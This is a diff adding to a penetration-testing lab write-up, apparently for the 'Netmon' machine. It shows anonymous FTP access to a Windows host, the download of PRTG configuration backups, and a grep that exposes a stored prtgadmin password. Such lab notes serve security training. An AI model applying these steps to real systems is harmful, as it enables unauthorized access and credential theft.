@@ -116,5 +116,126 @@ ftp> exit
 
 uoooohhh!
 
+Search on ftp folders, very important run ls -la to show hiden folders instead of dir:
 
+```shell
+└──╼ $ftp 10.129.43.221
+Connected to 10.129.43.221.
+220 Microsoft FTP Service
+Name (10.129.43.221:darthv): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls -la
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
+02-03-19  12:18AM                 1024 .rnd
+11-20-16  09:59PM               389408 bootmgr
+07-16-16  09:10AM                    1 BOOTNXT
+02-03-19  08:05AM       <DIR>          Documents and Settings
+02-25-19  10:15PM       <DIR>          inetpub
+09-10-22  03:06PM            738197504 pagefile.sys
+07-16-16  09:18AM       <DIR>          PerfLogs
+02-25-19  10:56PM       <DIR>          Program Files
+02-03-19  12:28AM       <DIR>          Program Files (x86)
+12-15-21  10:40AM       <DIR>          ProgramData
+02-03-19  08:05AM       <DIR>          Recovery
+02-03-19  08:04AM       <DIR>          System Volume Information
+02-03-19  08:08AM       <DIR>          Users
+02-25-19  11:49PM       <DIR>          Windows
+226 Transfer complete.
+ftp> cd ProgramData
+250 CWD command successful.
+ftp> ls -la
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  08:05AM       <DIR>          Application Data
+12-15-21  10:40AM       <DIR>          Corefig
+02-03-19  08:05AM       <DIR>          Desktop
+02-03-19  08:05AM       <DIR>          Documents
+02-03-19  12:15AM       <DIR>          Licenses
+11-20-16  10:36PM       <DIR>          Microsoft
+02-03-19  12:18AM       <DIR>          Paessler
+02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
+07-16-16  09:18AM       <DIR>          SoftwareDistribution
+02-03-19  08:05AM       <DIR>          Start Menu
+02-03-19  12:15AM       <DIR>          TEMP
+02-03-19  08:05AM       <DIR>          Templates
+11-20-16  10:19PM       <DIR>          USOPrivate
+11-20-16  10:19PM       <DIR>          USOShared
+02-25-19  10:56PM       <DIR>          VMware
+226 Transfer complete.
+ftp> cd Paessler
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+09-10-22  03:48PM       <DIR>          PRTG Network Monitor
+226 Transfer complete.
+ftp> cd "PRTG Network Monitor"
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+12-15-21  08:23AM       <DIR>          Configuration Auto-Backups
+09-10-22  03:06PM       <DIR>          Log Database
+02-03-19  12:18AM       <DIR>          Logs (Debug)
+02-03-19  12:18AM       <DIR>          Logs (Sensors)
+02-03-19  12:18AM       <DIR>          Logs (System)
+09-10-22  03:06PM       <DIR>          Logs (Web Server)
+09-10-22  03:07PM       <DIR>          Monitoring Database
+02-25-19  10:54PM              1189697 PRTG Configuration.dat
+02-25-19  10:54PM              1189697 PRTG Configuration.old
+07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
+09-10-22  03:48PM              1679225 PRTG Graph Data Cache.dat
+02-25-19  11:00PM       <DIR>          Report PDFs
+02-03-19  12:18AM       <DIR>          System Information Database
+02-03-19  12:40AM       <DIR>          Ticket Database
+02-03-19  12:18AM       <DIR>          ToDo Database
+226 Transfer complete.
+ftp> bin
+200 Type set to I.
+ftp> mget "PRTG Configuration.dat"
+mget PRTG Configuration.dat? y
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1189697 bytes received in 0.57 secs (2.0020 MB/s)
+ftp> mget "PRTG Configuration.old"
+mget PRTG Configuration.old? yes
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1189697 bytes received in 0.48 secs (2.3409 MB/s)
+ftp> mget "PRTG Configuration.old.bak"
+mget PRTG Configuration.old.bak? yes
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1153755 bytes received in 1.88 secs (600.0062 kB/s)
+ftp> quit
+221 Goodbye.
+```
+
+Lets find prtgadmin user on some of this files:
+```shell
+└──╼ $grep prtgadmin -b1 PRTG\ Configuration.old.bak 
+10178-            <dbpassword>
+10204:	      <!-- User: prtgadmin -->
+10237-	      PrTg@dmin2018
+--
+1150986-                <login>
+1151011:                  prtgadmin
+1151040-                </login>
+┌─[darthv@parrot]─[~/git/badorius/vulnhub/Netmon/enumeration]
+
+```
+
+
+
+```shell
+
+```
 
